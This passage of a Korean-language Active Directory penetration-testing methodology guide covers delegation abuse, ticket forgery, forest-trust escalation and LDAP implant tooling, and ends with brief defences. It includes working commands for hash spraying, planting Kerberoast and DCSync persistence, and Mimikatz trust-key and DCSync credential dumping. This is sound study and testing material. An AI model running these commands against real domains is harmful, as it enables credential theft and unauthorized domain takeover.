이 attack은 일반적인 NTLM protocol을 통한 Pass The Hash의 대안으로 **user의 NTLM hash를 사용하여 Kerberos tickets를 request**하는 것을 목표로 합니다. 따라서 **NTLM protocol이 disabled되고** authentication protocol로 **Kerberos만 허용되는** networks에서 특히 **유용**할 수 있습니다.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** method에서 attackers는 password나 hash values 대신 **user의 authentication ticket을 steal**합니다. 이후 이 stolen ticket을 사용하여 **user를 impersonate**하고, network 내 resources 및 services에 unauthorized access를 얻습니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrato**r의 **hash** 또는 **password**를 가지고 있다면, 이를 사용하여 다른 **PCs에 locally login**할 수 있는지 시도해야 합니다.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이 내용은 상당히 **noisy**하며 **LAPS**가 이를 **mitigate**할 수 있다는 점에 유의하세요.

### MSSQL Abuse & Trusted Links

사용자에게 **MSSQL instances에 access**할 권한이 있다면, 이를 사용하여 MSSQL host에서 **commands를 execute**할 수 있고( SA로 실행 중인 경우), NetNTLM **hash를 steal**하거나 **relay** **attack**을 수행할 수도 있습니다.\
MSSQL instance가 다른 instance에 의해 database link를 통해 trusted 상태라면, linked database에 대한 권한이 있는 사용자는 **trust relationship을 사용하여 다른 instance에서 queries를 execute**할 수 있습니다. 이러한 trust는 chain으로 연결될 수 있으며, 최종적으로 사용자가 commands를 execute할 수 있는 잘못 구성된 database에 도달할 수 있습니다.\
**Databases 간의 links는 forest trusts를 가로질러서도 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory 및 deployment suites는 credentials 및 code execution으로 이어지는 강력한 경로를 노출하는 경우가 많습니다. 다음을 참조하세요:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute가 있는 Computer object를 발견했고 해당 computer에 대한 domain privileges가 있다면, 해당 computer에 login하는 모든 users의 memory에서 TGTs를 dump할 수 있습니다.\
따라서 **Domain Admin이 해당 computer에 login하면**, 그의 TGT를 dump하고 [Pass the Ticket](pass-the-ticket.md)을 사용하여 그를 impersonate할 수 있습니다.\
Constrained delegation 덕분에 **Print Server를 자동으로 compromise**할 수도 있습니다(바라건대 해당 서버가 DC이기를 바랍니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자 또는 computer가 "Constrained Delegation"에 허용되어 있다면, **computer의 일부 services에 access하기 위해 모든 user를 impersonate**할 수 있습니다.\
그런 다음 이 user/computer의 **hash를 compromise**하면, **일부 services에 access하기 위해 모든 user**(domain admins 포함)를 **impersonate**할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 computer의 Active Directory object에 대해 **WRITE** privilege를 보유하면 **elevated privileges**로 code execution을 달성할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user에게는 일부 domain objects에 대한 **interesting privileges**가 있을 수 있으며, 이를 통해 laterally **move**하거나 privileges를 **escalate**할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain 내에서 **Spool service listening**을 발견하면 이를 **abuse**하여 **new credentials를 acquire**하고 **privileges를 escalate**할 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Other users**가 **compromised** machine에 **access**하면, memory에서 credentials를 **gather**하고 그들의 processes에 beacons를 **inject**하여 그들을 impersonate할 수도 있습니다.\
일반적으로 users는 RDP를 통해 system에 access하므로, 여기서는 third-party RDP sessions에 대해 수행할 수 있는 몇 가지 attacks를 설명합니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 domain-joined computers의 **local Administrator password**를 관리하는 system을 제공하며, password가 **randomized**되고 unique하며 자주 **changed**되도록 보장합니다. 이러한 passwords는 Active Directory에 저장되고, access는 authorized users에게만 허용되도록 ACLs를 통해 제어됩니다. 이 passwords에 access할 충분한 permissions가 있으면 다른 computers로 pivot할 수 있습니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised machine에서 **certificates를 gather**하는 것은 environment 내부에서 privileges를 escalate하는 방법이 될 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates**가 구성되어 있다면 이를 abuse하여 privileges를 escalate할 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 높은 privilege account를 사용한 Post-exploitation

### Domain Credentials Dumping

**Domain Admin** 또는 더 나아가 **Enterprise Admin** privileges를 획득하면 **domain database**인 _ntds.dit_를 **dump**할 수 있습니다.

[**DCSync attack에 대한 자세한 정보는 여기에서 확인할 수 있습니다**](dcsync.md).

[**NTDS.dit를 steal하는 방법에 대한 자세한 정보는 여기에서 확인할 수 있습니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Persistence로서의 Privesc

앞서 설명한 일부 techniques는 persistence에 사용할 수 있습니다.\
예를 들면 다음을 수행할 수 있습니다:

- users를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- users를 [**ASREPRoast**](asreproast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- user에게 [**DCSync**](#dcsync) privileges 부여하기

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**은 **NTLM hash**(예: **PC account의 hash**)를 사용하여 특정 service에 대한 **legitimate Ticket Granting Service (TGS) ticket**을 생성합니다. 이 방법은 **service privileges에 access**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**은 attacker가 Active Directory (AD) environment에서 **krbtgt account의 NTLM hash**에 access하는 방식입니다. 이 account는 모든 **Ticket Granting Tickets (TGTs)**에 서명하는 데 사용되므로 특별하며, TGTs는 AD network 내에서 authentication하는 데 필수적입니다.

이 hash를 획득하면 attacker는 원하는 모든 account에 대한 **TGTs**를 생성할 수 있습니다(Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이는 **일반적인 golden tickets detection mechanisms를 우회**하는 방식으로 위조된 golden tickets와 유사합니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**account의 certificates를 보유하거나 이를 request할 수 있는 것**은 user account에 persistence할 수 있는 매우 좋은 방법입니다(사용자가 password를 변경하더라도):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates를 사용하면 domain 내부에서 high privileges로 persistence하는 것도 가능합니다:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** object는 이러한 groups 전체에 표준 **Access Control List (ACL)**을 적용하여 **privileged groups**(예: Domain Admins 및 Enterprise Admins)의 security를 보장하고 unauthorized changes를 방지합니다. 그러나 이 feature는 exploit될 수 있습니다. attacker가 AdminSDHolder의 ACL을 수정하여 regular user에게 full access를 부여하면, 해당 user는 모든 privileged groups에 대해 광범위한 control을 얻게 됩니다. 보호를 목적으로 하는 이 security measure는 면밀히 monitor하지 않으면 오히려 역효과를 내어 부당한 access를 허용할 수 있습니다.

[**AdminDSHolder Group에 대한 자세한 정보는 여기에서 확인할 수 있습니다.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)** 내부에는 **local administrator** account가 존재합니다. 이러한 machine에서 admin rights를 획득하면 **mimikatz**를 사용하여 local Administrator hash를 extract할 수 있습니다. 이후 **이 password의 사용을 enable**하려면 registry modification이 필요하며, 이를 통해 local Administrator account에 remote access할 수 있습니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 domain objects에 대해 **user**에게 일부 **special permissions**를 **give**하여 해당 user가 **향후 privileges를 escalate**할 수 있도록 만들 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors**는 **object가 다른 object에 대해 보유한 permissions**를 **store**하는 데 사용됩니다. object의 **security descriptor**를 약간만 **change**할 수 있다면, privileged group의 member가 되지 않고도 해당 object에 대해 매우 흥미로운 privileges를 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class를 abuse하여 `entryTTL`/`msDS-Entry-Time-To-Die`가 설정된 수명이 짧은 principals/GPOs/DNS records를 생성합니다. 이 objects는 tombstones를 남기지 않고 self-delete되어 LDAP evidence를 지우지만, orphan SIDs, 손상된 `gPLink` references 또는 cached DNS responses(예: AdminSDHolder ACE pollution이나 malicious `gPCFileSysPath`/AD-integrated DNS redirects)를 남깁니다.

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

**universal password**를 설정하기 위해 memory상의 **LSASS**를 alter하여 모든 domain accounts에 access할 수 있도록 합니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자체 **SSP**를 생성하여 machine에 access하는 데 사용되는 **credentials**를 **clear text**로 **capture**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD에 **new Domain Controller**를 register하고 이를 사용하여 지정된 objects에 **attributes**(SIDHistory, SPNs...)를 **push**하며, **modifications**에 관한 **logs**를 남기지 않습니다. **DA** privileges가 필요하며 **root domain** 내부에 있어야 합니다.\
잘못된 data를 사용하면 매우 보기 좋지 않은 logs가 나타난다는 점에 유의하세요.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 **LAPS passwords를 read할 충분한 permission**이 있을 때 privileges를 escalate하는 방법에 대해 설명했습니다. 그러나 이러한 passwords는 **persistence를 maintain**하는 데에도 사용할 수 있습니다.\
다음을 확인하세요:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 security boundary로 간주합니다. 이는 단일 domain을 **compromise**하면 잠재적으로 전체 Forest가 compromise될 수 있음을 의미합니다.<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **domain**의 user가 다른 **domain**의 resources에 access할 수 있도록 하는 security mechanism입니다. 이는 본질적으로 두 domains의 authentication systems 사이에 linkage를 생성하여 authentication verifications가 seamless하게 전달되도록 합니다. Domains가 trust를 설정하면 trust의 integrity에 중요한 특정 **keys**를 교환하고 **Domain Controllers (DCs)**에 보관합니다.

일반적인 scenario에서 user가 **trusted domain**의 service에 access하려면 먼저 자신의 domain DC에 special ticket인 **inter-realm TGT**를 request해야 합니다. 이 TGT는 두 domains가 합의한 shared **key**로 encrypt됩니다. 그런 다음 user는 이 TGT를 **trusted domain의 DC**에 제시하여 service ticket(**TGS**)을 받습니다. trusted domain의 DC가 inter-realm TGT를 성공적으로 validate하면 TGS를 issue하여 user에게 service access를 부여합니다.

**Steps**:

1. **Domain 1**의 **client computer**가 **NTLM hash**를 사용하여 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 request하면서 process를 시작합니다.
2. client가 successful하게 authenticated되면 DC1이 new TGT를 issue합니다.
3. 그런 다음 client는 **Domain 2**의 resources에 access하는 데 필요한 **inter-realm TGT**를 DC1에 request합니다.
4. inter-realm TGT는 two-way domain trust의 일부로 DC1과 DC2가 shared하는 **trust key**로 encrypt됩니다.
5. client는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**로 전달합니다.
6. DC2는 shared trust key를 사용하여 inter-realm TGT를 verify하고, valid하면 client가 access하려는 Domain 2의 server에 대한 **Ticket Granting Service (TGS)**를 issue합니다.
7. 마지막으로 client는 이 TGS를 server에 제시합니다. TGS는 server's account hash로 encrypt되어 있으며, 이를 통해 Domain 2의 service에 access합니다.

### Different trusts

**trust는 1-way 또는 2-way일 수 있다**는 점을 알아두는 것이 중요합니다. 2-way option에서는 두 domains가 서로를 trust하지만, **1-way** trust relation에서는 한 domain이 **trusted** domain이고 다른 domain이 **trusting** domain입니다. 후자의 경우 **trusted domain에서 trusting domain 내부의 resources에만 access**할 수 있습니다.

Domain A가 Domain B를 trust한다면 A는 trusting domain이고 B는 trusted domain입니다. 또한 **Domain A**에서 이는 **Outbound trust**이며, **Domain B**에서는 **Inbound trust**입니다.

**Different trusting relationships**

- **Parent-Child Trusts**: 동일한 forest 내에서 일반적으로 사용되는 setup으로, child domain은 parent domain과 자동으로 two-way transitive trust를 갖습니다. 즉, authentication requests가 parent와 child 사이에서 seamless하게 흐를 수 있습니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, referral processes를 빠르게 처리하기 위해 child domains 사이에 설정됩니다. 복잡한 forests에서는 authentication referrals가 일반적으로 forest root까지 올라갔다가 target domain으로 내려와야 합니다. Cross-links를 생성하면 이 경로가 짧아지며, geographic하게 분산된 environments에서 특히 유용합니다.
- **External Trusts**: 서로 다르고 관련 없는 domains 사이에 설정되며 본질적으로 non-transitive입니다. [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면 external trusts는 forest trust로 연결되지 않은 현재 forest 외부 domain의 resources에 access할 때 유용합니다. External trusts에서는 SID filtering을 통해 security가 강화됩니다.
- **Tree-root Trusts**: forest root domain과 새로 추가된 tree root 사이에 자동으로 설정됩니다. 자주 접하지는 않지만, tree-root trusts는 forest에 new domain trees를 추가하고 고유한 domain name을 유지하면서 two-way transitivity를 보장하는 데 중요합니다. 자세한 정보는 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에서 확인할 수 있습니다.
- **Forest Trusts**: 두 forest root domains 사이의 two-way transitive trust이며, security measures를 강화하기 위해 SID filtering도 적용합니다.
- **MIT Trusts**: non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains와 설정됩니다. MIT trusts는 보다 specialized되어 있으며 Windows ecosystem 외부의 Kerberos-based systems와 integration이 필요한 environments를 대상으로 합니다.

#### **trusting relationships**의 기타 차이

- Trust relationship은 **transitive**일 수도 있습니다(A가 B를 trust하고, B가 C를 trust하면 A가 C를 trust함). 또는 **non-transitive**일 수 있습니다.
- Trust relationship은 **bidirectional trust**(서로 trust함) 또는 **one-way trust**(한쪽만 다른 쪽을 trust함)로 설정할 수 있습니다.

### Attack Path

1. **trusting relationships를 Enumerate**
2. 어떤 **security principal**(user/group/computer)이 **other domain**의 resources에 **access**할 수 있는지 확인합니다. 이는 ACE entries를 통해서이거나 other domain의 groups에 속해 있기 때문일 수 있습니다. **domains 간의 relationships**를 찾아보세요(아마 이것이 trust가 생성된 이유일 것입니다).
1. 이 경우 kerberoast가 또 다른 option일 수 있습니다.
3. domains를 통해 **pivot**할 수 있는 **accounts를 Compromise**합니다.

Attacker가 다른 domain의 resources에 access할 수 있는 주요 mechanisms는 다음 세 가지입니다:

- **Local Group Membership**: Principals가 machine의 local groups, 예를 들어 server의 “Administrators” group에 추가되어 해당 machine에 대한 상당한 control을 얻을 수 있습니다.
- **Foreign Domain Group Membership**: Principals는 foreign domain 내 groups의 member가 될 수도 있습니다. 그러나 이 방법의 effectiveness는 trust의 특성과 group의 scope에 따라 달라집니다.
- **Access Control Lists (ACLs)**: Principals가 **ACL**, 특히 **DACL** 내 **ACEs**의 entities로 지정되어 특정 resources에 access할 수 있습니다. ACLs, DACLs 및 ACEs의 mechanics를 자세히 알아보려는 경우 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” whitepaper가 매우 유용한 resource입니다.<sup>[[17]](#references)</sup>

### permissions가 있는 external users/groups 찾기

Domain 내 foreign security principals를 찾으려면 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인할 수 있습니다. 이는 **external domain/forest**의 user/group입니다.

**Bloodhound**에서 확인하거나 powerview를 사용할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest 권한 상승
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 trust를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **신뢰된 키는 2개**이며, 하나는 _Child --> Parent_용이고 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용되는 키는 다음 명령으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 악용하여 child/parent domain에서 Enterprise admin으로 권한을 상승시킵니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### writeable Configuration NC 악용

Configuration Naming Context (NC)를 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 forest 전반의 구성 데이터를 저장하는 중앙 저장소 역할을 합니다. 이 데이터는 forest 내 모든 Domain Controller (DC)에 복제되며, writable DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 **DC에서 SYSTEM privileges**를 보유해야 하며, 가능하면 child DC가 좋습니다.

**GPO를 root DC site에 연결**

Configuration NC의 Sites container에는 AD forest 내 domain-joined computer의 site 정보가 포함됩니다. 모든 DC에서 SYSTEM privileges로 작업하면 공격자는 GPO를 root DC site에 연결할 수 있습니다. 이 작업을 통해 해당 site에 적용되는 policy를 조작하여 root domain을 잠재적으로 침해할 수 있습니다.

자세한 내용은 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)에 관한 연구를 참고할 수 있습니다.<sup>[[12]](#references)</sup>

**forest 내 모든 gMSA 침해**

또 다른 attack vector는 domain 내 privileged gMSA를 대상으로 삼는 것입니다. gMSA의 password 계산에 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 모든 DC에서 SYSTEM privileges를 보유하면 KDS Root key에 접근하여 forest 전체의 모든 gMSA password를 계산할 수 있습니다.

자세한 분석과 단계별 지침은 다음에서 확인할 수 있습니다:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

추가적인 delegated MSA attack (BadSuccessor – migration attributes 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

이 method는 새로운 privileged AD object가 생성될 때까지 기다리는 인내심이 필요합니다. SYSTEM privileges를 사용하면 공격자는 AD Schema를 수정하여 모든 user에게 모든 class에 대한 complete control을 부여할 수 있습니다. 이로 인해 새로 생성되는 AD object에 대한 unauthorized access 및 control이 가능해질 수 있습니다.

자세한 내용은 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)에서 확인할 수 있습니다.<sup>[[14]](#references)</sup>

**DA에서 EA로: ADCS ESC5**

ADCS ESC5 vulnerability는 Public Key Infrastructure (PKI) object에 대한 control을 악용하여 forest 내 모든 user로 authentication할 수 있는 certificate template을 생성하는 것을 목표로 합니다. PKI object는 Configuration NC에 있으므로 writable child DC를 compromise하면 ESC5 attack을 실행할 수 있습니다.

자세한 내용은 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)에서 확인할 수 있습니다.<sup>[[15]](#references)</sup> ADCS가 없는 환경에서는 공격자가 필요한 component를 설정할 수 있으며, 이에 대해서는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 설명합니다.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) 또는 bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서는 **사용자의 domain이 외부 domain으로부터 신뢰**되며, 외부 domain에 대해 **확인되지 않은 권한**을 부여받습니다. 사용자의 domain에 속한 **어떤 principal이 외부 domain에 대해 어떤 access 권한을 갖는지** 찾아낸 다음 이를 exploit해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
이 시나리오에서 **your domain**은 **different domains**의 principal에게 일부 **privileges**를 **trusting**하고 있습니다.

하지만 **domain is trusted** by the trusting domain이면, trusted domain은 **predictable name**을 사용하는 **user**를 생성하며, 이 사용자의 **password**로 trusted password를 사용합니다. 즉, **trusting domain의 user에 access하여 trusted domain 내부로 들어간 뒤** 이를 enumerate하고 더 많은 **privileges**로 escalation을 시도할 수 있습니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain을 compromise하는 또 다른 방법은 domain trust와 **opposite direction**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다. 이는 흔한 경우는 아닙니다.

trusted domain을 compromise하는 또 다른 방법은 **trusted domain의 user가 access할 수 있는** machine에서 대기하며 해당 user가 **RDP**를 통해 login하기를 기다리는 것입니다. 그러면 attacker는 RDP session process에 code를 inject하고, 그곳에서 victim의 **origin domain**에 **access**할 수 있습니다.\
또한 **victim이 자신의 hard drive를 mount했다면**, attacker는 **RDP session** process에서 해당 **hard drive의 startup folder**에 **backdoors**를 저장할 수 있습니다. 이 technique을 **RDPInception**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trust에서 SID history attribute를 활용하는 attack의 위험은 SID Filtering으로 완화되며, SID Filtering은 모든 inter-forest trust에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 입장에 따라 domain이 아닌 forest를 security boundary로 간주하고 intra-forest trust가 안전하다는 가정에 기반합니다.
- 그러나 주의할 점이 있습니다. SID filtering은 applications 및 user access를 방해할 수 있어 간혹 비활성화됩니다.

### **Selective Authentication:**

- inter-forest trust에서 Selective Authentication을 사용하면 두 forest의 users가 자동으로 authenticated되지 않습니다. 대신 users가 trusting domain 또는 forest 내부의 domains 및 servers에 access하려면 명시적인 permissions가 필요합니다.
- 이러한 조치로도 writable Configuration Naming Context (NC)의 exploitation이나 trust account에 대한 attacks는 방어할 수 없다는 점에 유의해야 합니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants에서 LDAP 기반 AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD 스타일의 LDAP primitives를 x64 Beacon Object Files로 재구현하며, 이러한 파일은 on-host implant(예: Adaptix C2) 내부에서 전적으로 실행됩니다. Operators는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 pack을 compile하고, `ldap.axs`를 load한 다음 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 traffic은 현재 logon security context를 통해 LDAP (389)의 signing/sealing 또는 auto certificate trust가 적용된 LDAPS (636)로 전송되므로 socks proxy나 disk artifact가 필요하지 않습니다.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, `get-groupmembers`는 short name/OU path를 full DN으로 resolve하고 해당 objects를 dump합니다.
- `get-object`, `get-attribute`, `get-domaininfo`는 security descriptors를 포함한 임의의 attributes와 `rootDSE`의 forest/domain metadata를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, `get-rbcd`는 LDAP에서 직접 roasting candidates, delegation settings 및 기존 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors를 노출합니다.
- `get-acl` 및 `get-writable --detailed`는 DACL을 parse하여 trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) 및 inheritance를 나열하므로 ACL privilege escalation의 즉각적인 targets를 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 권한 상승 및 persistence를 위한 LDAP write primitives

- Object creation BOF(`add-user`, `add-computer`, `add-group`, `add-ou`)는 operator가 OU 권한이 존재하는 위치에 새로운 principal 또는 machine account를 준비할 수 있게 합니다. `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`는 write-property 권한이 확인된 후 대상을 직접 hijack합니다.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`와 같은 ACL 중심 명령은 모든 AD object에 대한 WriteDACL/WriteOwner를 PowerShell/ADSI artifact를 남기지 않고 password reset, group membership control 또는 DCSync replication privilege로 변환합니다. `remove-*` counterpart는 삽입된 ACE를 정리합니다.

### Delegation, roasting 및 Kerberos abuse

- `add-spn`/`set-spn`은 compromised user를 즉시 Kerberoastable 상태로 만들며, `add-asreproastable`(UAC toggle)은 password를 건드리지 않고 AS-REP roasting 대상으로 표시합니다.
- Delegation macro(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC flag 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 다시 작성하여 constrained/unconstrained/RBCD attack path를 활성화하고 remote PowerShell 또는 RSAT의 필요성을 제거합니다.

### sidHistory injection, OU relocation 및 attack surface shaping

- `add-sidhistory`는 controlled principal의 SID history에 privileged SID를 삽입합니다([SID-History Injection](sid-history-injection.md) 참조). 이를 통해 LDAP/LDAPS만으로 stealthy access inheritance를 제공합니다.
- `move-object`는 computer 또는 user의 DN/OU를 변경하므로, attacker는 `set-password`, `add-groupmember` 또는 `add-spn`을 abuse하기 전에 delegated right가 이미 존재하는 OU로 asset을 이동시킬 수 있습니다.
- 범위가 엄격하게 지정된 removal command(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등)는 operator가 credential 또는 persistence를 수집한 후 신속한 rollback을 수행할 수 있게 하여 telemetry를 최소화합니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 몇 가지 일반적인 방어

[**credential 보호 방법에 대해 자세히 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **Credential 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins는 Domain Controller에만 login할 수 있도록 하고, 다른 host에서는 사용하지 않는 것이 좋습니다.
- **Service Account privilege**: 보안을 유지하려면 service를 Domain Admin(DA) privilege로 실행하지 않아야 합니다.
- **Temporary privilege limitation**: DA privilege가 필요한 task의 경우 privilege 사용 기간을 제한해야 합니다. 다음과 같이 수행할 수 있습니다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 완화**: Event ID 2889/3074/3075를 audit한 다음 DC/client에서 LDAP signing과 LDAPS channel binding을 적용하여 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity의 protocol-level fingerprinting

